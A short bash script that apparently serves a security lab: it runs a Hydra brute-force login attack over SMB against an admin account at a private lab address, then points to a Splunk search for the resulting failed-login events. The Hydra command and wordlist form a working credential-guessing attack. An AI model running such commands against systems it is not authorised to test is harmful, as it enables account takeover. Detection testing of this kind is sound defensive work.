#!/bin/bash
# brute-force-simulation.sh
# Simulates brute-force attack using Hydra

echo "[*] Brute Force Attack Simulation"
echo "[*] Target: 192.168.56.20 (admin account)"
echo ""

# Install hydra if needed
if ! command -v hydra &> /dev/null; then
    echo "[*] Installing hydra..."
    sudo apt install hydra -y
fi

# Create wordlist
echo "[*] Creating password wordlist..."
cat > /tmp/wordlist.txt << EOF
password1
password2
wrongpass
admin123
123456
EOF

echo "[*] Starting Hydra brute-force attack..."
echo "[*] This will generate failed login events"
echo ""

hydra -l admin -P /tmp/wordlist.txt 192.168.56.20 smb -v

echo ""
echo "[*] Attack simulation complete"
echo "[*] Check Splunk for failed login events (EventCode=4625)"
echo "[*] Search: index=security EventCode=4625 | stats count by src_ip"
